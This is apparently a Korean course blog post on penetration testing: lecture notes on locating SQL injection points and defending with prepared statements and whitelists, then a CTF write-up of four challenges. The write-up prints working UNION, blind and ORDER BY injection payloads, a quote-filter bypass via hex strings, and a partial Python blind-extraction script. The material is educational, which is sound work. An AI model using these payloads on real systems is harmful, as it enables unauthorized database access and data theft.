--- meta
title: Penetration Testing | Week 8
date: 2025/06/01
excerpt: SQL Injection 취약점 탐색
categories: 모의 해킹
---

### 강의 노트

#### SQL Injection 취약점 탐색

지금까지 다양한 SQL Injection 공격 기법들을 학습해 왔다. 이러한 기법들을 실제 환경에서 적용하기 위해서는, 웹 페이지 내 SQL Injection 취약점이 존재하는 지점을 식별하는 과정이 선행되어야 한다. 그러나 이전에 해결해 온 CTF 문제들과는 달리, 실제 웹 사이트의 경우에는 SQL Injection이 가능한 위치조차 명확히 파악하기 어려운 경우가 대부분이다. 이러한 이유로 인해 SQL Injection 취약점을 효과적으로 탐색하는 기술적 노하우 역시 모의 해킹 및 실전 보안 진단에서 매우 중요한 요소로 작용한다. 그렇다면 어떻게 SQL Injection 취약점을 찾아 낼 수 있을까?

기본적으로 SQL Injection은 데이터베이스에 대해 SQL 쿼리를 수행하는 지점에서 발생한다. 대표적인 사례로는 로그인 페이지의 입력란이나 게시판 페이지의 검색란 등을 들 수 있다. 웹 애플리케이션의 일반적인 동작 방식을 고려할 때, 이러한 지점에 입력되는 값이 백엔드 스크립트 내부의 SQL 쿼리에 포함될 가능성이 높다는 점을 추론할 수 있다.

이와 같이 서버에 전송되는 값이 SQL 쿼리에 반영된다고 판단되면, 다음 단계로는 Blind SQL Injection의 적용 가능성을 우선적으로 확인해야 한다. 이는 Blind SQL Injection이 타 SQL Injection 기법들에 비해 상대적으로 제약이 적은 특징을 지니기 때문이다. 이때 핵심적으로 고려해야 할 사항은 주어진 조건의 진릿값을 기반으로 웹 애플리케이션의 반응이 달라지는지를 식별하는 것이다. 만약 적절한 페이로드를 삽입하였을 때 조건식의 결과에 따라 출력 내용이나 페이지 동작 등에서 차이가 감지된다면 해당 지점은 Blind SQL Injection에 취약할 가능성이 있다. 이를 토대로 추가적인 분석을 수행함으로써 이후 UNION SQL Injection이나 Error-Based SQL Injection 등을 시도해 볼 수 있다.

SQL Injection 취약점 탐색을 위한 절차를 정리하면 다음과 같다.

**1\. SQL 쿼리를 사용될 가능성이 있는 지점을 탐색**  
**2\. 서버로 전송되는 값이 SQL 쿼리에 포함되는지 확인**  
**3\. 사용되는 SQL 쿼리를 적절히 예측하고 해당 구조에 맞게 조건식이 포함된 페이로드 삽입**  
**4\. 조건식의 평가 결과에 따라 애플리케이션 동작에 차이가 발생하는지 관찰**  

---

#### SQL Injection 대응 방법

##### Prepared Statement

**Prepared Statement**란 미리 정의된 구조의 SQL 쿼리를 컴파일하여 준비하고, 실행할 때 필요한 값을 바인딩하여 사용하는 방식을 말한다. 다음의 예시를 보자.

```php
$stmt = $mysqli->prepare("SELECT * FROM users WHERE email = ?");
$stmt->bind_param("s", "user@example.com"); // string 타입
$stmt->execute();
```

Prepared Statement를 사용하는 기본적인 PHP 코드이다. 위 코드는 `prepare()` 함수를 통해 실행할 SQL 쿼리 템플릿을 사전에 데이터베이스에 전달하고, 변수가 삽입될 위치를 `?` 기호를 사용하여 명시한다. 이후 실제로 `?` 자리에 데이터를 삽입하는 경우 `bind_param()` 함수를 사용해 `"user@example.com"`이라는 값을 안전하게 바인딩한다. 마지막으로 `execute()` 함수를 통해 쿼리를 실행하면 준비된 쿼리가 데이터베이스에 대해 실행되고 그 결과를 조회할 수 있다.

이러한 방식을 사용하면 사용자가 전송하는 데이터가 SQL 쿼리에 그대로 삽입되는 것이 아니라, 미리 컴파일되어 저수준의 언어로 변환된 쿼리 구조 내에 변수로서 삽입된다. 따라서, 해당 데이터에 `'`와 같은 특수 기호가 포함되어 있더라도 SQL 문법으로 해석되지 않고 순수한 문자열 데이터로 안전하게 처리된다. 이러한 구조적 특성에 따라 SQL Injection이 원천적으로 차단된다.

그러나 Prepared Statement를 사용할 수 없는 예외적인 경우도 존재한다. 대표적인 사례로는 `ORDER BY`절이 있으며, 이는 해당 절에서 사용되는 값이 변수가 아닌 컬럼명이기 때문이다. 테이블명, 컬럼명 등과 같이 데이터베이스에 실제로 정의된 객체는 Prepared Statement의 바인딩 기능을 통해 동적으로 지정할 수 없다. 다시 말해, 이러한 식별자는 `?`와 같은 플레이스홀더로 대체할 수 없으며, 변수를 바인딩하여 처리하는 방식이 적용되지 않는다.

이로 인해, `ORDER BY`절과 같이 식별자가 동적으로 결정되는 구문에서는 Prepared Statement의 보안 효과를 활용할 수 없다. 특히 웹 애플리케이션에서 `sort`, `ord` 등과 같은 파라미터명을 통해 정렬 기준을 전달하는 방식이 사용되는 경우, 해당 값이 `ORDER BY`절에 직접 삽입되는지 여부를 검토하고 SQL Injection이 유효한지 확인해 보는 것이 좋다.

<br>

##### White List Flitering

**White List Filtering**이란 허용된 항목만 통과시키고 나머지는 차단하는 보안 방식을 말한다. 이를테면 `' or '1' = '1`과 같은 페이로드를 막기 위해 다음과 같은 방법을 사용할 수 있다.

```php
function isValidUsername($username) {
    // preg_match(): 정규표현식과 비교하여 패턴에 맞으면 1, 아니면 0을 반환하는 함수
    return preg_match('/^[a-zA-Z0-9]+$/', $username); // 영문 대소문자 및 숫자만 존재하는지 검사
}

$user_input = $_GET['username'];

if (isValidUsername($user_input)) {
  // SQL 쿼리 실행
} else {
  // SQL 쿼리 실행 차단
}

...
```

위 코드는 White List Flitering 방식을 사용하는 대표적인 예시이다. 해당 코드에서는 `$username` 변수가 영문 대소문자 및 숫자로만 구성된 경우에 한해 SQL 쿼리 실행을 허용하며, 이외의 모든 경우에는 쿼리 실행을 차단한다. 이러한 방식은 `' or '1' = '1`과 같은 SQL Injection 공격 페이로드를 효과적으로 차단하는 데 유용하다.

이와 대비되는 개념으로 **Black List Filtering** 방식이 존재한다. 이는 사전에 지정된 항목들을 차단 목록(Black List)에 등록하고, 해당 목록에 포함된 항목에 대해서만 필터링 및 차단을 수행하는 방식이다. 블랙 리스트 방식은 차단 항목을 미리 정의하여 관리하는 특성상, 알려지지 않은 공격 패턴에 취약할 수 있다는 한계가 존재한다.

---

#### 모의 해킹 수행 시 유의 사항

##### 데이터 조작 기반 SQL 구문 테스트 시 안전성 고려

`INSERT`, `DELETE`, `UPDATE` 구문을 대상으로 하는 보안 취약점 분석은 원칙적으로 지양하는 것이 바람직하며, 불가피한 경우에도 최대한의 주의가 요구된다. 특히, `OR` 연산자나 주석 기호 등을 페이로드에 삽입하는 행위는 데이터베이스에 예기치 못한 영향을 초래할 가능성이 있으므로 반드시 신중하게 접근해야 한다. 가능한 한 `AND` 연산자 정도만을 사용하여 테스트하는 것이 상대적으로 안전한 방법으로 권장된다.

##### 주석 기호 사용 최소화 및 구조 중심 접근 권장

주석 기호는 SQL Injection 공격 수행 시 강력한 도구가 될 수 있으나, 그 사용은 절제되어야 하며 남용해서는 안 된다. 주석을 이용하여 불필요한 쿼리의 일부를 제거하기보다는, 전체 쿼리 구조를 예측한 후 해당 구조에 부합하는 방식으로 페이로드를 작성하는 것이 보다 안전하고 바람직하다. 이는 특히 실제 운영 환경의 SQL 쿼리가 복수의 행으로 구성되어 있고 복잡한 경우가 많다는 점에서 더욱 그러하며, 이로 인해 주석 기호의 정확한 작동 방식이 예측하기 어려운 경우도 존재하기 때문이다.

##### 식별된 취약점을 이용한 데이터 무결성 훼손 금지

SQL Injection 취약점이 식별되었더라도, 이로 인해 데이터베이스에 저장된 정보를 임의로 변조하거나 삭제하는 행위는 절대적으로 금지된다. 개인정보의 변경, 새로운 사용자 계정의 생성, 또는 기타 시스템 상태를 변경하는 행위는 윤리적·법적 문제를 수반할 수 있으며, 이에 따라 해당 행위는 보안 분석의 범위를 명백히 벗어나는 것으로 간주된다.

<br>
<br>
<br>

### 과제

#### SQL Injection Advanced CTF

![SQL Injection Advanced CTF](/data/Penetration%20Testing%20%7C%20Week%208/1.png)

CTF를 해결하며 실제 웹 페이지와 유사한 환경에서 SQL Injection 취약점을 탐색해 보자.

<br>

##### SQL Injection Point 1

<img src="/data/Penetration%20Testing%20%7C%20Week%208/2.png" alt="SQL Injection Point 1" style="padding: 0 200px; background-color: white">

링크의 주소로 접속하면 다음과 같은 웹 페이지로 이동한다.

![SQL Injection Point 1](/data/Penetration%20Testing%20%7C%20Week%208/3.png)

해당 웹 애플리케이션은 간단한 회원제 게시판 애플리케이션으로, 다음과 같은 페이지들로 구성되어 있었다.

- `signup.html`: 회원 가입 페이지
- `login.php`: 로그인 페이지
- `mypage.php`: 사용자 정보 페이지
- `notice_list.php`: 게시판 페이지
- `notice_write.php`: 게시물 작성 페이지
- `notice_read.php`: 게시물 열람 페이지
- `notice_update.php`: 게시물 수정 페이지
- `notice_delete.php`: 게시물 삭제 페이지

우선 로그인 페이지에서 제공된 여러 CTF 문제를 해결한 경험을 바탕으로, 회원가입을 진행하여 `any`/`any` 계정을 생성한 뒤 `login.php`에서 SQL Injection을 시도해 보기로 결정하였다.

![SQL Injection Point 1](/data/Penetration%20Testing%20%7C%20Week%208/4.png)

몇 차례 시도한 결과 로그인 페이지에서의 SQL Injection은 실패하였으며, 로그인 시 `user=any`라는 쿠키 값이 설정된다는 사실만을 파악할 수 있었다.

다음으로 `mypage.php`로 이동하여 SQL Injection을 시도해 보았다.

![SQL Injection Point 1](/data/Penetration%20Testing%20%7C%20Week%208/5.png)

마이페이지에서는 사용자 정보(아이디, 기타 정보, 비밀번호)를 확인 및 수정할 수 있는 기능을 제공하고 있었고, 사용자 정보가 데이터베이스로부터 SQL 쿼리를 통해 조회된 후 화면에 출력되고 있다고 판단하였다. 로그인 이후 설정된 `user=any` 쿠키를 고려하면, `select column_name from table_name where user = '$user'`와 같은 쿼리가 사용될 가능성이 존재한다. 따라서 쿠키의 `user` 값을 `any' and '1' = '1`로 수정하여 요청을 전송해 보았다.

![SQL Injection Point 1](/data/Penetration%20Testing%20%7C%20Week%208/6.png)

쿼리의 조건절이 `where user = 'any' and '1' = '1`과 같은 형태로 변경되면 논리적으로 의미 차이가 존재하지 않으므로, 동일한 결과가 반환될 것으로 예상되었다. 그러나 아이디 필드의 플레이스홀더는 전송한 페이로드가 가공되지 않은 상태로 그대로 출력되었고, 이에 따라 해당 데이터는 데이터베이스로부터 조회된 아이디 값이 아니라 쿠키의 `user` 값이 직접적으로 전달된 것임을 추정할 수 있었다. 하지만 기타 정보 필드의 플레이스홀더는 여전히 데이터베이스에서 조회된 데이터일 가능성이 있었으므로, 보다 정밀한 검증을 위해 쿠키의 `user` 값을 `any' and '1' = '2`로 수정하여 다시 요청을 전송해 보았다.

![SQL Injection Point 1](/data/Penetration%20Testing%20%7C%20Week%208/7.png)

그 결과 기타 정보 필드의 플레이스홀더가 출력되지 않았다. 이는 해당 데이터가 실제로 데이터베이스로부터 조회되어 출력되고 있었음을 의미하며, 쿼리의 조건절이 거짓으로 평가됨에 따라 데이터가 반환되지 않았다는 점을 시사한다.

삽입한 페이로드의 조건식의 진릿값을 기반으로 애플리케이션의 동작이 달라짐을 확인하였으므로 Blind SQL Injection을 사용해 데이터를 추출해낼 수 있다. 하지만 이 경우 기타 정보 필드에 출력되는 데이터가 있으므로 UNION SQL Injection을 사용할 수 있는 여지가 존재한다. 따라서 페이로드에 `ORDER BY`절을 결합하여 사용되는 테이블의 컬럼 수를 파악해 보았다.

![SQL Injection Point 1](/data/Penetration%20Testing%20%7C%20Week%208/8.png)
![SQL Injection Point 1](/data/Penetration%20Testing%20%7C%20Week%208/9.png)

컬럼 수가 오직 1개임을 파악하였다. 그렇다면 해당 컬럼의 값이 곧 기타 정보 필드에 출력되는 것임을 의미한다. 따라서 쿠키의 user 값을 `any' union select database()`로 수정해 보았다.

![SQL Injection Point 1](/data/Penetration%20Testing%20%7C%20Week%208/10.png)

성공적으로 현재 데이터베이스명이 출력되었다. 이후 데이터 추출을 위한 UNION SQL Injection 절차를 순서대로 수행하였다.

![SQL Injection Point 1](/data/Penetration%20Testing%20%7C%20Week%208/11.png)

모든 절차를 수행한 뒤 플래그를 획득할 수 있었다.

<p style="text-align: center;">Flag: <span style="color: green">segfault{<span style="filter: blur(5px);">youDidIt!GOOOD</span>}</span></p>

<br>

##### SQL Injection Point 2

<img src="/data/Penetration%20Testing%20%7C%20Week%208/12.png" alt="SQL Injection Point 2" style="padding: 0 200px; background-color: white">

링크의 주소로 접속하면 SQL Injection Point 1과 동일한 회원제 게시판 애플리케이션으로 이동한다.

로그인 페이지 및 마이페이지에서 SQL Injection을 시도해 보았지만 실패하였고, 이번에는 게시판 페이지를 조사해 보기로 결정하였다.

![SQL Injection Point 2](/data/Penetration%20Testing%20%7C%20Week%208/13.png)

우선 예시로 `test` 게시물을 생성한 후, 게시물 검색 기능을 사용해 보았다.

![SQL Injection Point 2](/data/Penetration%20Testing%20%7C%20Week%208/14.png)

검색 기준을 작성자로 설정하고 `an`을 검색하면, 서버에는 `option_val=username&board_result=an`과 같은 데이터가 전달된다. 따라서 `option_val` 파라미터에 검색 기준이 되는 컬럼명이 전달되며, `board_result`에는 실제 데이터와 대응되는 검색어가 전달되는 것을 알 수 있다. `an`을 입력했을 때 작성자가 `any`인 게시물이 검색었으므로, `select column_name(s) from table_name where $option_val like '%$board_result%'`와 같은 형태의 쿼리가 사용될 것으로 예측되었다. 따라서 `board_result` 파라미터에 `an%' and '1%' = '1`를 입력하여 요청을 전송해 보았다.

![SQL Injection Point 2](/data/Penetration%20Testing%20%7C%20Week%208/15.png)

검색 결과가 존재하지 않았다. 필터링 등의 조치가 취해져 있을 가능성도 있겠으나, 이를 우회하는 방식은 차후에 고려하고 `option_val` 파라미터를 이용한 SQL Injection을 먼저 시도해 보기로 결정하였다. `option_val` 파라미터의 값을 `1 = 1 and username`으로 수정하면, `WHERE`절이 `where 1 = 1 and username like '%an%'`의 형태가 되어 논리적으로 동일한 의미를 가진다. 이와 같이 수정한 요청을 전송해 보았다.

![SQL Injection Point 2](/data/Penetration%20Testing%20%7C%20Week%208/16.png)

정상적으로 검색 결과가 출력되었다.

![SQL Injection Point 2](/data/Penetration%20Testing%20%7C%20Week%208/17.png)

`option_val` 파라미터를 `1 = 2 and username`으로 수정하면 검색 결과가 존재하지 않는다는 사실 역시 확인할 수 있었고, 조건식의 진릿값에 따른 애플리케이션 동작 차이가 확인되었으므로 Blind SQL Injection을 수행할 수 있게 되었다. 하지만 이번에도 화면에 출력되는 데이터가 존재하므로 UNION SQL Injection이 사용 가능한지 확인해 보기로 결정하였다. `option_val` 파라미터를 `1 = 1 order by 1#`과 같은 형태로 수정하여 요청을 전송해 보았다.

![SQL Injection Point 2](/data/Penetration%20Testing%20%7C%20Week%208/18.png)
![SQL Injection Point 2](/data/Penetration%20Testing%20%7C%20Week%208/19.png)

`order by 10`까지는 검색 결과가 출력되고, `order by 11`을 입력하면 출력되지 않는다는 사실을 확인하였다. 따라서 사용되는 테이블의 컬럼 수는 10개임을 알 수 있었다. 또한 기본적으로 보이지 않던 다른 게시물들 역시 검색되었는데, `WHERE`절의 조건식이 `1 = 1`이 됨에 따라 테이블에 존재하는 모든 레코드가 출력되면서 모종의 이유로 숨겨져 있던 게시물들 또한 검색된 것으로 보인다.

다음으로 `option_val` 값을 `1 = 1 union select 1, 2, 3, 4, 5, 6, 7, 8, 9, 10#`으로 수정하여 출력되는 컬럼의 위치를 확인하였다.

![SQL Injection Point 2](/data/Penetration%20Testing%20%7C%20Week%208/20.png)

1, 2, 3, 4번째 컬럼이 출력되는 것을 확인하였다. 이후 데이터베이스명, 테이블명, 컬럼명을 순차적으로 추출하고 플래그 획득에 성공하였다.

![SQL Injection Point 2](/data/Penetration%20Testing%20%7C%20Week%208/21.png)

<p style="text-align: center;">Flag: <span style="color: green">segfault{<span style="filter: blur(5px);">columnCanBeDangerous</span>}</span></p>

<br>

##### SQL Injection Point 3

<img src="/data/Penetration%20Testing%20%7C%20Week%208/22.png" alt="SQL Injection Point 3" style="padding: 0 200px; background-color: white">

링크의 주소로 접속하면 마찬가지로 회원제 게시판 애플리케이션으로 이동한다.

전체적인 구조를 살펴 보던 중 앞선 문제들과는 다른 점을 발견하였다.

![SQL Injection Point 3](/data/Penetration%20Testing%20%7C%20Week%208/23.png)

게시판 페이지에서 검색을 수행했을 때, `sort`라는 파라미터가 같이 전달된다는 사실을 파악할 수 있었다. 따라서 게시물 검색에 사용되는 쿼리를 `select column_name(s) from table_name where $option_val like '%$board_result%' order by $sort`와 같은 형태로 예측하였다. `ORDER BY`절은 특히 Prepared Statement를 사용할 수 없다는 특징이 있어 더욱 취약한 지점 중 하나이기 때문에, `sort` 파라미터를 사용해 SQL Injection을 시도해 보기로 결정하였다.

예시 게시물을 작성한 뒤, `sort` 파라미터에 `case when (1 = 1) then 1 else (select 1 union select 2) end`를 입력하고 요청을 전송해 보았다.

> **CASE**
>
> <strong>`CASE`</strong>는 조건에 따라 값을 선택할 때 사용하는 표현식 키워드로, 프로그래밍 언어의 `if else`와 비슷한 역할을 한다.
>
> 사용 예시는 아래와 같다.
>
> <pre><code class="language-sql hljs" data-highlighted="yes"><span class="hljs-comment">/* Syntax */</span>
> <span class="hljs-keyword">CASE</span> <span class="hljs-keyword">WHEN</span> condition <span class="hljs-keyword">THEN</span> result1 <span class="hljs-keyword">ELSE</span> result2 <span class="hljs-keyword">END</span>
>
> <span class="hljs-comment">/* Example */</span>
> <span class="hljs-keyword">CASE</span> <span class="hljs-keyword">WHEN</span> x <span class="hljs-operator">&gt;</span> <span class="hljs-number">0</span> <span class="hljs-keyword">THEN</span> <span class="hljs-string">'pos'</span> <span class="hljs-keyword">ELSE</span> <span class="hljs-string">'neg'</span> <span class="hljs-keyword">END</span> <span class="hljs-comment">-- 반환 값: 조건이 참이면 'pos', 거짓이면 'neg'</span>
> </code></pre>

![SQL Injection Point 3](/data/Penetration%20Testing%20%7C%20Week%208/24.png)

`sort` 파라미터에 삽입한 페이로드는 조건이 참이므로 `1`의 값으로 변환되며, 게시물 검색 결과를 테이블의 첫 번째 컬럼을 기준으로 정렬시킨다. 조건식을 `1 = 2`로 변경하면 어떻게 될까?

![SQL Injection Point 3](/data/Penetration%20Testing%20%7C%20Week%208/25.png)

이번에는 검색 결과가 반환되지 않는다. 그 이유는 페이로드의 조건식이 거짓이기 때문에 `select 1 union select 2`의 값으로 변환되기 때문이다. 이는 하나의 값이 아닌 2개 행으로 이루어진 테이블 형태이므로, `ORDER BY` 절 뒤에 결합되면 오류가 발생한다. 따라서 정상적으로 쿼리 결과가 반환될 수 없다.

> `CASE`를 사용하지 않고 다음과 같은 형태를 사용하는 것도 가능하다.
>
> ```sql
> (SELECT 1 UNION SELECT 2 WHERE 1 = 1) -- 반환 결과: 1열 2행 테이블(1행: 1, 2행: 2)
> (SELECT 1 UNION SELECT 2 WHERE 1 = 2) -- 반환 결과: 1
> ```
>
> 이 구문은 `CASE`를 사용했을 때와 비교하여 조건식의 진릿값에 따른 결과 반환이 반대로 동작하므로 사용 시 조건 평가 방식에 유의할 필요가 있다.

이로써 조건식의 진릿값에 따른 애플리케이션의 동작 차이를 확인하였다. 이번에는 데이터가 출력되는 위치를 확인할 수 없으므로, 바로 Blind SQL Injection을 사용하기로 결정하였다. 7주차에 사용했던 자동화 스크립트를 소폭 수정하여 실행해 보았다.

```python
# blind_sqli.py

import requests

url = "http://ctf2.segfaulthub.com:7777/sqli_8/notice_list.php"

def is_true(row, idx, asc):
  if sql.strip().lower() == "select database()" and row > 0:
    return False
  payload = f"(select 1 union select 2 where ascii(substr(({sql} limit {row}, 1), {idx},
              1)) > {asc})"
  cookie = {"PHPSESSID": "h1u9p1k1pg8sr0ii3gdac8m3k5"}
  data = {"option_val": "username", "board_result": "any", "board_search":
          "%F0%9F%94%8D", "date_from": "", "date_to": "", "sort": payload}
  return "any" not in requests.post(url, cookies = cookie, data = data).text

def find_char(row, idx, low = 32, high = 126):
  ...

def extract_data():
  ...

while True:
  sql = input("Enter the SQL query to extract data.(Press 'q' to quit.)\nSQL > ")
  if sql == "q":
    break
  print(f"[+] Data extracted: {", ".join(extract_data())}\n")
```

스크립트 실행 결과는 다음과 같다.

![SQL Injection Point 3](/data/Penetration%20Testing%20%7C%20Week%208/26.png)

데이터 추출 과정을 거쳐 최종적으로 플래그를 획득하였다.

<p style="text-align: center;">Flag: <span style="color: green">segfault{<span style="filter: blur(5px);">orderBySQLPossible</span>}</span></p>

<br>

##### SQL Injection Point 4

<img src="/data/Penetration%20Testing%20%7C%20Week%208/27.png" alt="SQL Injection Point 4" style="padding: 0 200px; background-color: white">

링크의 주소로 접속하면 마찬가지로 회원제 게시판 애플리케이션으로 이동한다.

SQL Injection 취약점을 탐색하던 도중 SQL Injection Point 2에서 발견했던 위치에서 동일하게 취약점이 존재한다는 것을 확인하였다.

![SQL Injection Point 4](/data/Penetration%20Testing%20%7C%20Week%208/28.png)
![SQL Injection Point 4](/data/Penetration%20Testing%20%7C%20Week%208/29.png)

`ORDER BY`절을 사용하여 테이블의 컬럼 수가 10개인 것을 확인하였고, 마찬가지로 UNION SQL Injection을 시도해 보았다.

![SQL Injection Point 4](/data/Penetration%20Testing%20%7C%20Week%208/30.png)

데이터베이스명 `sqli_9`가 정상적으로 출력되는 것을 확인하였다. 이후 테이블명을 추출하기 위해 `option_val` 파라미터에 `1 = 1 union select 1, table_name, 3, 4, 5, 6, 7, 8, 9, 10 from information_schema.tables where table_schema = 'sqli_9'#`를 입력했을 때 문제가 발생하였다.

![SQL Injection Point 4](/data/Penetration%20Testing%20%7C%20Week%208/31.png)

검색 결과가 반환되지 않았다. 데이터베이스명은 정상적으로 출력되었음을 감안하면, 입력한 페이로드에서 특정 문자가 필터링되고 있을 가능성이 높다고 생각하였다. 다양한 가능성을 모색하며 페이로드를 수 차례 수정하던 중, 예상치 못한 방식으로 단서를 발견할 수 있었다.

![SQL Injection Point 4](/data/Penetration%20Testing%20%7C%20Week%208/32.png)

페이로드에서 `WHERE`절을 제거하고 `1 = 1 union select 1, table_name, 3, 4, 5, 6, 7, 8, 9, 10 from information_schema.tables#`까지만 입력한 경우 SQL Injection 공격이 성공적으로 이루어지는 것을 확인하였다. 이후 `UNION SELECT`문을 통해 반환된 결과를 확인하기 위해 기존에 테이블에 존재하던 게시물 목록을 지나쳐 가던 도중, 중간에서 제목이 `' 필터`인 게시물을 발견하였다.

입력한 페이로드와 대조하며 검토한 결과, 페이로드 내의 작은따옴표(`'`) 문자가 필터링되고 있었음을 명확히 알 수 있었다. 검색 결과가 반환된 것은 페이로드에서 `where table_schema = 'sqli_9'` 구문이 제거되어 작은따옴표가 포함되지 않음으로써 SQL 쿼리가 정상적으로 수행된 결과였던 것이다.

![SQL Injection Point 5](/data/Penetration%20Testing%20%7C%20Week%208/33.png)

또한, 기대한 바와 같이 플래그가 존재하는 테이블명 역시 출력되었음을 확인할 수 있었다.

이제 컬럼명을 추출하기 위해 `option_val` 파라미터에 `1 = 1 union select 1, column_name, 3, 4, 5, 6, 7, 8, 9, 10 from information_schema.columns where table_name = 'flagHere'#`를 입력할 차례이다. 필터링을 우회하기 위해 마찬가지로 `where table_name = 'flagHere'` 구문을 삭제하고 그 중 테이블명이 `flagHere`인 컬럼을 직접 찾는 방법도 있겠지만, 어떤 문자가 필터링되는지 명확하게 확인하였기 때문에 문자열을 바이너리 데이터로 바꾸는 방법을 사용하였다. `flagHere` 문자열을 16진수 바이너리 값으로 변환하면 `0x666c616748657265`이므로, `'flagHere'` 위치에 해당 값을 대신 삽입한 뒤 요청을 전송해 보았다.

![SQL Injection Point 5](/data/Penetration%20Testing%20%7C%20Week%208/34.png)

컬럼명 `flag`가 추출되었고, `option_val` 파라미터에 최종적으로 `1 = 1 union select 1, flag, 3, 4, 5, 6, 7, 8, 9, 10 from flagHere#`를 입력하여 플래그를 획득하였다.

![SQL Injection Point 5](/data/Penetration%20Testing%20%7C%20Week%208/35.png)

<p style="text-align: center;">Flag: <span style="color: green">segfault{<span style="filter: blur(5px);">isHard?Nope!</span>}</span></p>